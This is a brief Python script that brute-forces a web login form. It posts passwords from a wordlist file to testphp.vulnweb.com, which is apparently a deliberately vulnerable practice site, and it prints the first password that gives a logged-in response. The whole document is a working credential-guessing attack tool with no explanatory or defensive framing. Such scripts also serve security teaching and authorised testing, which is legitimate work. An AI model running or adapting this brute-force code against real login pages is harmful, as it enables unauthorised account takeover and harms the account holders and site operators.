#!/usr/bin/python3
# Use Python to try different passwords from a wordlist on a login page.
import requests


url = "http://testphp.vulnweb.com/userinfo.php"
username = "test"

def attack(password):
    data = {
        "uname": username,
        "pass": password
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://testphp.vulnweb.com/login.php"
    }

    response = requests.post(url, data=data, headers=headers)

    if "Welcome" in response.text or "Logout" in response.text:
        print(f"valid credentials: {username}:{password}")
        return True
    else:
        print(f"Invalid: {password}")
        return False

with open("password.txt", "r") as file:
    for line in file:
        password = line.strip()
        if attack(password):
            break
